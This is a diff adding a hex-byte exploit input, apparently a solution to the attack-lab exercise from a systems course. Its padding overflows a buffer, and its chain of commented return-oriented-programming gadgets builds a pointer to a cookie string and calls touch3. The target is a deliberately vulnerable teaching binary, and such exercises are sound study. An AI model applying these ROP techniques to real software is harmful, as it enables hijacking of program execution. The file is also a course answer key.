@@ -1,0 +1,19 @@
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+ed 19 40 00 00 00 00 00 /* gadget1 from addval_310: movq %rsp,%rax */
+ab 19 40 00 00 00 00 00 /* gadget2 from addval_312: movq %rax,%rdi */
+b4 19 40 00 00 00 00 00 /* gadget3 from setval_394: popq %rax */
+50 00 00 00 00 00 00 00 /* &cookie - &gadget1 */
+fe 19 40 00 00 00 00 00 /* gadget4 from addval_199: xchg %eax,%edx */
+5a 1a 40 00 00 00 00 00 /* gadget5 from addval_192: movl %edx,%ecx; and %cl, %cl */
+46 1a 40 00 00 00 00 00 /* gadget6 from getval_340: movl %ecx,%esi */
+bd 19 40 00 00 00 00 00 /* gadget7 entirety of add_xy: lea (%rdi,%rsi,1),%rax */
+ab 19 40 00 00 00 00 00 /* gadget8: copy of gadget2 */
+f4 18 40 00 00 00 00 00 /* touch3 address*/
+36 34 38 65 38 63 64 30 /* cookie */
+00 00 00 00 00 00 00 00
